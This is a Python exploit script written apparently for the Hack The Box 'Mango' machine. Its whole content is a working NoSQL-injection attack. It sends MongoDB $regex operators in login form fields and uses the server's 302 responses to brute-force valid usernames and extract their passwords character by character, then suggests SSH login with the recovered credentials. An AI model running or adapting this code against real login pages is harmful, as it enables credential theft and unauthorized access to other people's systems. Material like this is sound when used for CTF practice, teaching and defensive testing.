#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64
import string
from paramiko import SSHClient

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)

args = parser.parse_args()

s = requests.Session()


def get_cookie(target):

    url = "http://%s/" % target

    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Host" : target
        }
    #proxy = {"http": "127.0.0.1:8080"}

    r = s.post(url, headers=headers) # proxies=proxy

    #Extract the PHP SESSID cookie
    print("[SUCCESS] PHPSESSID cookie obtained: " + str(s.cookies.get_dict()["PHPSESSID"]))
    return s.cookies.get_dict()["PHPSESSID"]



def get_users(target, cookie):

    possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]

    url = "http://%s/" % target
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Host" : target
        }
    cookies = {"PHPSESSID": cookie}
    #proxy = {"http": "127.0.0.1:8080"}

    print("[INFO] Starting to brute force usernames...")

    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        r = s.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False) # proxies=proxy
        if int(r.status_code) == 302:
            print("[INFO] Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("[SUCCESS] Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


def get_password(target, username, cookie):

    possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]

    url = "http://%s/" % target
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Host" : target
        }
    cookies = {"PHPSESSID": cookie}
    #proxy = {"http": "127.0.0.1:8080"}
    
    print("\n[INFO] Starting with the password discovery...")
    possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
    print("[INFO] Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            r = s.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False) #proxies=proxy
            if int(r.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            valid_password = password[1:].replace("\\", "")
            print("Found password " + valid_password + " for username "+username)
            return valid_password
    


def main():
    answer = str(input("[QUESTION] The target needs to be staging-order.mango.htb, did you already add it to the /etc/hosts file? (yes/no) "))
    if answer == "yes":
        cookie_value = get_cookie(args.target)
        usernames = get_users(args.target, cookie_value)

        for user in usernames:
            password = get_password(args.target, user, cookie_value)
            if user == "mango":
                print("[SUCCESS] Try to SSH using this set of credentials: " + str(user) + ":" + str(password) + " ;)")

    else:
        print("[ERROR] You need to add staging-order.mango.htb to the /etc/hosts before proceeding with the exploitation....")

if __name__ == "__main__":
    main()
